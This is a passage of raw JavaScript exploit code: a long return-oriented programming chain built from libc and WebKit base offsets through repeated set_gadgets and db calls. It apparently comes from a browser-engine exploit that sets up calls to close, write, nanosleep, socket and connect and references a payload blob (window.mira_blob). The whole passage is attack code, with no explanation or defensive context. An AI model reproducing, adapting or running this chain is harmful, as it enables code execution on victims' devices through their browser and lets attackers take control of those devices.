webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
close_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+185256,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
write_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+186584,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
nanosleep_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+187912,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
socket_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+189240,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
connect_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+190568,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+190640,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+190704,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([2104, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+190808,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+190840,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+190952,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+190936,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([1, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([2, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+792472
]);

db([4096, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+191264,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+75236,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([1, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+792472
]);

db([2, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+191456,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+75236,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+792472
]);

db([4, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+191600,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+75236,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+191712,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([65536, 0]);
set_gadget(libc_base+788575,);

db([65536, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+191840,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+191824,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+191992,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+215952,

libc_base+882884,
libc_base+793877
]);
db([4294967248, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+192064,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+2997875,
libc_base+759626,
libc_base+792472,

(window.mira_blob||0),
libc_base+793877
]);

db([4294967280, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+2997875,
libc_base+759626,
libc_base+793877
]);

db([4294967280, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+192264,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+192280,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+192416,
webkit_base+7438103,
libc_base+793877,
ropchain+192480,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+192432,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+192464,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+269973,
webkit_base+414627,
libc_base+793877,
ropchain+192592,
libc_base+547636,
libc_base+186490,
libc_base+793877,
ropchain+192584,
webkit_base+7438103,
webkit_base+1786005,
libc_base+811575
]);

db([0, 0]);
set_gadgets([
ropchain+192608,
ropchain+198928,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967276, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+192704,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+954100,
libc_base+793877,
ropchain+192760,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);

set_gadgets([
libc_base+793877,
ropchain+192808,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967276, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+192912,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+192928,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+193080,
webkit_base+7438103,
libc_base+793877,
ropchain+193112,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+193064,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+193096,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+193184,
webkit_base+7438103,
libc_base+793877,
ropchain+193200,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+193296,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+193280,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+193376,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([65536, 0]);
set_gadget(libc_base+788575,);

db([65536, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+193528,
webkit_base+7438103,
libc_base+793877,
ropchain+193544,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+193512,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+14959219,
webkit_base+48555,
libc_base+269973,
libc_base+793877,
ropchain+193712,
webkit_base+7438103,
libc_base+793877,
ropchain+193728,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+193696,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+193832,
webkit_base+7438103,
libc_base+793877,
ropchain+193880,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+193848,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+269973,
webkit_base+414627,
libc_base+793877,
ropchain+193992,
libc_base+547636,
libc_base+186490,
libc_base+793877,
ropchain+193984,
webkit_base+7438103,
webkit_base+1786005,
libc_base+811575
]);

db([0, 0]);
set_gadgets([
ropchain+194008,
ropchain+194024,
libc_base+811575,
ropchain+194040,

libc_base+811575,
ropchain+198912,

libc_base+793877,
ropchain+194080,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967280, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+194184,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+194200,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+194344,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+194312,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+194328,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+194416,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+194472,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+194552,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
